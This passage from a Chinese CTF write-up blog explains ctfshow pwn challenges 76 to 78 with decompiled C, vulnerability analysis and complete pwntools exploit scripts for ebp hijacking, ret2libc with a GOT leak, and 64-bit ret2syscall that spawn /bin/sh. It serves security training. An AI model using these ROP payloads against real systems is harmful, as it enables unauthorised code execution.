comment\">#payload2=payload2.ljust(0x28,b\"a\")</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#payload2+=p32(buf-4)+p32(leave_ret)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#p.sendline(\"/bin/sh\\x00\")</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn76代码逻辑分析md5base64加解密\"><a class=\"anchor\" href=\"#pwn76代码逻辑分析md5base64加解密\">#</a> pwn76 (代码逻辑分析，MD5，base64 加解密)</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p>题目描述: <code>还是那句话，理清逻辑很重要</code></p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/4VW%5DCNAVJ2BH%28L45%5B%2540K%7B4.png\" alt=\"\" /></p>\n<p>这里的逻辑就是，输入一个 base64 加密的字符串，然后程序会进行解密，并计算输入字符串的长度，输入的长度不能超过 12，将解密的字符串（v4）复制到 bss 段的 <code>input</code>  中，然后利用 else 语句中的 <code>auth函数</code> ，在这里面将 input 的内容在复制到 v4（输入 12 个字节能够覆盖 ebp），然后根据输入的内容的长度计算 md5 的值并打印，再和程序内固定的 md5 值进行比较，相等能拿到 flag</p>\n<h2 id=\"漏洞分析\"><a class=\"anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h2>\n<p>上面已经知道 <code>auth</code>  函数里面会将输入的字符串保存到 v4 中，最大能输入 12 个字节，这就可以覆盖 ebp，但是无法覆盖 ret，我认为是通过 ebp 导致最后执行完这个函数后会寻址 ebp 内保存的地址作为 main 的 ebp，这里被修改了，所以就会将修改后的地址作为 ebp 的地址然后执行这里的代码（作为 rop）</p>\n<p>返回到 ebp 后 esp 会 + 4，所以将后门放入伪造的地址加 4 处</p>\n<p>【base64 要加入库 <code>import base64</code> ，然后加密为  <code>base64.b64encode(payload)</code> 】</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28234</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"login: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>system_binsh<span class=\"token operator\">=</span><span class=\"token number\">0x08049284</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>intput<span class=\"token operator\">=</span><span class=\"token number\">0x0811EB40</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system_binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>intput<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn77rop需要栈对齐寻址数组\"><a class=\"anchor\" href=\"#pwn77rop需要栈对齐寻址数组\">#</a> pwn77 (rop 需要栈对齐，寻址数组)</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目</h2>\n<p>题目描述： <code>Ez ROP or Mid ROP ?</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> v2<span class=\"token punctuation\">[</span><span class=\"token number\">267</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-110h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">char</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10Bh] [rbp-5h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    v3 <span class=\"token operator\">=</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v0 <span class=\"token operator\">=</span> v4<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v2<span class=\"token punctuation\">[</span>v0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  result <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  v2<span class=\"token punctuation\">[</span>v4<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当输入了 0x110-4 个字节内容，可以看到圈出来的地方为 v4 的值（用来索引地址）<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/Y%7B%7BU%28KE46_B%7EL%5B%298WGWY%60GD.png\" alt=\"\" /></p>\n<p>所以我们可以根据上面的发现，来直接修改 v4：先有利用 v3 输入 <code>\\x118</code>  让 v2 在 <code>0x110-4</code>  的地方覆盖 v4 为 <code>\\x118</code> ，然后利用 v4 被修改的值反作用给 v2 去偏移为 <code>0x118</code>  的地方寻址到 ret</p>\n<p>官方的 wp 之所以是 <code>\\x18</code>  是因为高一位已经是 1 了，所以就不用写入 118 了，从上面的图也能发现是 <code>0x10c</code>  所以只需要覆盖 <code>0c</code>  为 <code>18</code>  即可</p>\n<p>而要想通过完整覆盖 3 位需要 <code>b&quot;a&quot;*(0x110-8)+p64(0x11500000000)</code>  这样来整个覆盖，至于为什么是 <code>115</code> ，因为调试时输入 <code>118</code>  最后显示为 <code>11b</code> ，所以这里减了 3 就恰好是 <code>118</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/T0IZU%2499B95RUH89%7DHL8D%25T.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn77')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn77'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./64libc.so.6\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28232</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fgetc_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"fgetc\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>main<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004008e3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400576</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"T^T\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x110</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x11500000000</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>fgetc_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>fgetc<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fgetc:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>fgetc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc_base<span class=\"token operator\">=</span>fgetc<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"fgetc\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"T^T\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x110</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x11500000000</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span> <span class=\"token comment\">#注意栈对齐</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn7864位系统调用\"><a class=\"anchor\" href=\"#pwn7864位系统调用\">#</a> pwn78（64 位系统调用）</h1>\n<h2 id=\"题目-10\"><a class=\"anchor\" href=\"#题目-10\">#</a> 题目</h2>\n<p>题目描述: <code>64位ret2syscall</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> v4<span class=\"token punctuation\">[</span><span class=\"token number\">80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-50h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CTFshowPWN!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"where is my system_x64?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fuck\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>题目说是系统调用，然后 ida 旁边一大堆函数，认为是静态编译，所以会有很多寄存器可以用，再找一下 <code>syscall</code>  命令来进行系统调用</p>\n<p>没有找到 <code>/bin/sh</code>  所以利用 read 系统调用来写入</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn import <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>from LibcSearcher import <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">context</span><span class=\"token expression\"><span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> </span><span class=\"token char\">'debug'</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">context</span><span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token char\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token char\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token char\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token char\">'./pwn78'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">e</span><span class=\"token expression\"><span class=\"token operator\">=</span><span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token char\">'./'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">p</span><span class=\"token expression\"><span class=\"token operator\">=</span><span class=\"token function\">remote</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span><span class=\"token number\">28231</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bss<span class=\"token operator\">=</span><span class=\"token number\">0x0000000006C1C61</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>syscall_ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000045BAC5</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>pop_rax<span class=\"token operator\">=</span><span class=\"token number\">0x000000000046b9f8</span> #pop_rax_ret，这里调用的寄存器都是分开的所以就要寄存器后面紧跟对应参数</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pop_rdi<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004016c3</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>pop_rsi<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004017d7</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pop_rbx<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004377d5</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system_x64?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload1<span class=\"token operator\">=</span>b<span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>syscall_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">+=</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">59</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>pop_rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>syscall_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 